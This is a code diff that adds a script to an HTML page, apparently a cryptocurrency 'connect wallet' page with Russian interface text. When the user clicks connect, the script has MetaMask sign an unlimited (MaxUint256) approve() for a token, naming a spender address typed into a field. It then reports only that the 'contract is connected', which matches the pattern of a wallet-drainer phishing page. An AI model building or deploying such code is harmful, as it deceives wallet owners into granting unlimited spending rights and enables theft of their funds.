@@ -22,4 +22,62 @@
     <div id="status" class="status">Ожидание действия.</div>
   </div>
 
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.2/dist/ethers.umd.min.js">
+  <!-- Рабочий CDN, который GitHub Pages НЕ блокирует -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.1/ethers.umd.min.js"></script>
+
+  <script>
+    const tokenAddress = "0x55d398326f99059fF775485246999027B3197955";
+    const abi = [
+      {
+        "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],
+        "name":"approve",
+        "outputs":[{"internalType":"bool","name":"","type":"bool"}],
+        "stateMutability":"nonpayable",
+        "type":"function"
+      }
+    ];
+
+    let provider;
+    let signer;
+
+    function setStatus(t) {
+      document.getElementById("status").textContent = t;
+    }
+
+    async function connect() {
+      try {
+        if (!window.ethereum) {
+          setStatus("MetaMask не найден.");
+          return;
+        }
+
+        await ethereum.request({ method: "eth_requestAccounts" });
+
+        provider = new ethers.BrowserProvider(window.ethereum);
+        signer = await provider.getSigner();
+
+        const spender = document.getElementById("spender").value.trim();
+        if (!spender) {
+          setStatus("Введите адрес контракта.");
+          return;
+        }
+
+        const token = new ethers.Contract(tokenAddress, abi, signer);
+        const max = ethers.MaxUint256;
+
+        setStatus("Отправка транзакции...");
+        const tx = await token.approve(spender, max);
+
+        setStatus("Ожидание подтверждения...\nTx: " + tx.hash);
+        await tx.wait();
+
+        setStatus("Готово. Контракт подключён.\nTx: " + tx.hash);
+      } catch (e) {
+        setStatus("Ошибка: " + (e.reason || e.message || e));
+      }
+    }
+
+    document.getElementById("connectBtn").onclick = connect;
+  </script>
+</body>
+</html>
